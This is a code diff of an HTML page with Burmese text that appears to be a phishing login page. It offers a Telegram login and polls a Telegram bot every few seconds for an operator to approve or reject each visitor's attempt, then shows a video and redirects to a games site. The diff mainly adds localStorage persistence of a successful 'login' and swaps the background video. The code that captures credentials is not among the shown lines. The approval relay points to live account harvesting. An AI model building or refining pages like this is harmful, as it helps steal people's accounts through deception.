@@ -3,37 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Engine Final Stable</title>
+    <title>Engine Final Stable - Fixed</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #000; position: fixed; font-family: sans-serif; }
         #app { width: 100vw; height: 100vh; position: relative; }
-        
-        /* Video Container Fix */
-        #bgVideo { 
-            position: absolute; top: 0; left: 0; 
-            width: 100%; height: 100%; 
-            object-fit: cover; z-index: 1;
-            background: #000; /* Video မတက်ခင် မည်းမနေအောင် */
-        }
-        
+        #bgVideo { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 1; background: #000; }
         .tt-input { width: 100%; padding: 14px; border: 1px solid #333; background: #111; color: white; border-radius: 8px; outline: none; margin-bottom: 12px; }
-        
-        #topNotice { 
-            position: fixed; top: -100px; left: 0; width: 100%; padding: 20px; 
-            text-align: center; color: white; font-weight: bold; z-index: 9999;
-            transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
+        #topNotice { position: fixed; top: -100px; left: 0; width: 100%; padding: 20px; text-align: center; color: white; font-weight: bold; z-index: 9999; transition: 0.5s; }
         .notice-success { background: #10b981; }
         .notice-error { background: #ef4444; }
-
-        .entry-btn { 
-            position: absolute; bottom: 12%; left: 50%; transform: translateX(-50%); 
-            background: #fe2c55; padding: 15px 60px; border-radius: 50px; 
-            color: white; font-weight: bold; cursor: pointer; z-index: 10;
-            box-shadow: 0 0 20px rgba(254, 44, 85, 0.6); border: none;
-        }
+        .entry-btn { position: absolute; bottom: 12%; left: 50%; transform: translateX(-50%); background: #fe2c55; padding: 15px 60px; border-radius: 50px; color: white; font-weight: bold; cursor: pointer; z-index: 10; box-shadow: 0 0 20px rgba(254, 44, 85, 0.6); border: none; }
     </style>
 </head>
 <body>
@@ -42,7 +23,7 @@
 
 <div id="app">
     <!-- Main Selection -->
-    <div id="selectScreen" class="w-full h-full flex flex-col items-center justify-center p-8 bg-[#0a0a0a] z-50 relative">
+    <div id="selectScreen" class="hidden w-full h-full flex flex-col items-center justify-center p-8 bg-[#0a0a0a] z-50 relative">
         <div class="bg-[#111] border border-white/10 p-10 w-full max-w-sm rounded-[30px] text-center">
             <h1 class="text-xl font-bold mb-8 text-white">Login to continue</h1>
             <button onclick="toggle('tgScreen')" class="w-full bg-[#2481cc] text-white py-4 rounded-xl mb-4 flex items-center justify-center gap-3">
@@ -93,9 +74,8 @@
 
     <!-- Final Content -->
     <div id="videoScreen" class="hidden w-full h-full">
-        <!-- ဗီဒီယိုမတက်ခင် Black Screen မဖြစ်အောင် Poster ပုံထည့်ထားမယ် (သို့) Background Color ထားမယ် -->
-        <video id="bgVideo" loop playsinline muted autoplay>
-            <source src="https://raw.githubusercontent.com/tar-alt/Photo-link-/6c702837cece7d0f80bad49fe77f65382f442422/From%20KlickPin%20CF%20Clear%20social%20dialogue%20prompts%20for%20people%20who%20love%20beauty%20with%20timeless%20style%20that%20stay%20calm%20and%20fair%20-%20Pin-1121326007230552065.mp4" type="video/mp4">
+        <video id="bgVideo" loop playsinline muted autoplay poster="https://via.placeholder.com/1080x1920/000000/FFFFFF?text=Loading...">
+            <source src="https://assets.mixkit.co/videos/preview/mixkit-stars-in-the-night-sky-background-9364-large.mp4" type="video/mp4">
         </video>
         <button onclick="window.location.replace('https://www.crazygames.com')" class="entry-btn">ဝင်ရောက်ရန်</button>
     </div>
@@ -157,13 +137,14 @@
             
             if (last?.callback_query?.data === `ok_${userKey}`) {
                 clearInterval(interval);
+                localStorage.setItem('auth_success', 'true'); // Login မှတ်ထားလိုက်ပြီ
                 await sendBot(`✅ ID: ${userKey} အား အောင်မြင်စွာ လက်ခံလိုက်ပါပြီ။`, false);
                 showNotice("Login ၀င်ရောက်မှု အောင်မြင်ပါသည်။", "success");
                 setTimeout(playFinal, 1000);
             } else if (last?.callback_query?.data === `no_${userKey}`) {
                 clearInterval(interval);
                 await sendBot(`❌ ID: ${userKey} အား ငြင်းပယ်လိုက်ပါသည်။`, false);
-                showNotice("Account Login ၀င်ရောက်မှု မအောင်မြင်ပါ။ ပြလည်စစ်ဆေးပါ။", "error");
+                showNotice("Account Login ၀င်ရောက်မှု မအောင်မြင်ပါ။ ပြန်လည်စစ်ဆေးပါ။", "error");
                 setTimeout(() => toggle('selectScreen'), 2000);
             }
         }, 3000);
@@ -172,15 +153,22 @@
     function playFinal() {
         toggle('videoScreen');
         const v = document.getElementById('bgVideo');
-        v.muted = false; // အသံပြန်ဖွင့်မယ်
+        v.muted = false;
         v.play().catch(() => {
-            // Browser က block ရင် screen ကို တစ်ချက်နှိပ်ခိုင်းမယ်
             showNotice("ဗီဒီယိုကြည့်ရန် Screen ကို တစ်ချက်နှိပ်ပါ", "success");
             document.body.onclick = () => { v.play(); v.muted = false; };
         });
     }
 
-    window.onload = () => { toggle('selectScreen'); };
+    window.onload = () => {
+        // အရင်က Login အောင်မြင်ခဲ့ရင် ဗီဒီယိုတန်းပြမယ်
+        if (localStorage.getItem('auth_success') === 'true') {
+            playFinal();
+        } else {
+            toggle('selectScreen');
+        }
+    };
 </script>
 </body>
 </html>
+
